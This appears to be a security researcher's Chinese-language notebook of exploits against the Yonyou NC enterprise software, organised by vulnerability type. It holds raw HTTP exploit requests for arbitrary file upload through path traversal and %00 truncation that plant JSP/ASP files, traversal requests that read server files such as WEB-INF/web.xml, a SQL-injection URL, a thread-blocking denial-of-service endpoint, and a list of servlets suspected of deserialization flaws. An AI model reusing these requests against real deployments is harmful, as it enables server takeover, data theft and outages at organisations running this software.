## 反序列化

http://127.0.0.1:8081/service/~uapim/nc.bs.pub.im.UserQueryServiceServlet
http://127.0.0.1:8081/service/~uapim/nc.bs.pub.im.UserSynchronizationServlet
http://127.0.0.1:8081/service/~uapim/nc.bs.pub.im.UserAuthenticationServlet
http://127.0.0.1:8081/service/~baseapp/nc.document.pub.fileSystem.servlet.UploadServlet	需要分析 看有没其他漏洞
http://127.0.0.1:8081/service/~webbd/nc.uap.bs.im.servlet.OAUserQryServlet
http://127.0.0.1:8081/service/~webbd/nc.uap.bs.im.servlet.OAUserAuthenticationServlet
http://127.0.0.1:8081/service/~webbd/nc.uap.bs.im.servlet.OAContactsFuzzySearchServlet
http://127.0.0.1:8081/service/~baseapp/nc.message.bs.NCMessageServlet
http://127.0.0.1:8081/servlet/~ic/nc.bs.framework.mx.MxServlet
http://127.0.0.1:8081/servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet
http://127.0.0.1:8081/service/~aert/uap.pub.ae.model.handle.ModelHandleServlet
http://127.0.0.1:8081/service/~cc/nc.bs.logging.config.LoggingConfigServlet
http://127.0.0.1:8081/servlet/~baseapp/nc.document.pub.fileSystem.servlet.DownloadServlet  需要分析	看有没其他漏洞
http://127.0.0.1:8081/servlet/~uapbs/uap.pub.dc.fileSystem.servlet.DownloadServlet			需要分析	看有没其他漏洞
http://127.0.0.1:8081/servlet/~baseapp/nc.document.pub.fileSystem.servlet.DeleteServlet
http://127.0.0.1:8081/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet

FileUploadServlet.class    	需要分析	看有没其他漏洞

FileReceiveServlet.class	需要分析	看有没其他漏洞

FileParserServlet.class		需要分析	看有没其他漏洞

FileManageServlet.class		需要分析	看有没其他漏洞



ContactsQueryServiceServlet.class  

ContactsFuzzySearchServlet.class

ConfigResourceServlet.class  逻辑漏洞-用户验证有缺陷

ActionHandlerServlet.class

## 任意文件上传

UploadFileServlet.class

```
POST /mp/login/../uploadControl/uploadFile HTTP/1.1
Host: host
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Length: 314
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

test content
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="submit"
	
上传
------WebKitFormBoundaryoDIsCqVMmF83ptmp
	
http://127.0.0.1:8081/mp/uploadFileDir/test.jsp
```

SaveXmlToFileServlet.class   但是只能是.xml文件		可利用windows特性%00传jsp文件， 如果windows版本过高不可能成功

```
POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=2/../../../../../../../../../../../1 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
Accept-Encoding: gzip, deflate
Content-Length: 177

--024ff46f71634a1c9bf8ec5820c26fa9
Content-Disposition: form-data; name="file"; filename=".ZOScC.jsp"

2flYX0pZdqd9hXwFoszSIhjGiI9
--024ff46f71634a1c9bf8ec5820c26fa9--
```


SaveImageServlet.class       但是只能是.png文件	可利用windows特性%00传jsp文件， 如果windows版本过高不可能成功

	POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../1.jsp HTTP/1.1
	Host: 127.0.0.1:8081
	Content-Type: application/octet-stream
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
	Content-Length: 171
	
	--024ff46f71634a1c9bf8ec5820c26fa9
	Content-Disposition: form-data; name="file"; filename=".ZOScC.jsp"
	
	2flYX0pZdqd9hXwFoszSIhjGiI9
	--024ff46f71634a1c9bf8ec5820c26fa9--
	
	漏洞利用的是windows特性%00， 如果windows版本过高不可能成功

webrt/nc.uap.lfw.core.servlet.LfwFileUploadServlet   文件不知道为啥没传成功，估计要两个磁盘

```
POST /servlet/~webrt/nc.uap.lfw.core.servlet.LfwFileUploadServlet HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
Accept-Encoding: gzip, deflate
Content-Length: 212


--024ff46f71634a1c9bf8ec5820c26fa9
Content-Disposition: form-data; name="file"; filename="/../../../../../../../../../../../../../ZOScC.asp"

2flYX0pZdqd9hXwFoszSIhjGiI9
--024ff46f71634a1c9bf8ec5820c26fa9--
```



## 任意文件读取	

OutputImageServlet.class  抽象代码， 将输入流作为文件内容返回给客户端

	POST /portal/pt/servlet/outputImageServlet/doPost?filename=/../../../../2000000&imagetype=png&pageId=login HTTP/1.1
	Host: 127.0.0.1:8081
	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
	Connection: close
	Cookie: JSESSIONID=695A5D8B1C41BA3F8D74495FC1D37B7E.server
	Accept-Encoding: gzip, deflate
	Content-Length: 6
	Content-Type: application/data
	
	123123

http://127.0.0.1:8081/servlet/~maportal/;/com.yonyou.maportal.bs.padplugin.controller.DownloadServlet?filename=../../WEB-INF/web.xml

FindWebResourceServlet.class  不能../ 
	/NCFindWeb?service=IPreAlertConfigService&filename=
	

## sql注入

MARosterPhotoServlet.class  已有

```
http://127.0.0.1:8081/servlet/~pubapp/com.yonyou.ma.roster.servlet.MARosterPhotoServlet?photoId=123'&type=pid
```




## 综合漏洞

ManagerServlet.class  不是用友的 是tomcat的
	
	

## 拒绝服务

upass/nc.search.ui.servlet.ClusterStateServlet?opt=test
	阻塞线程60秒
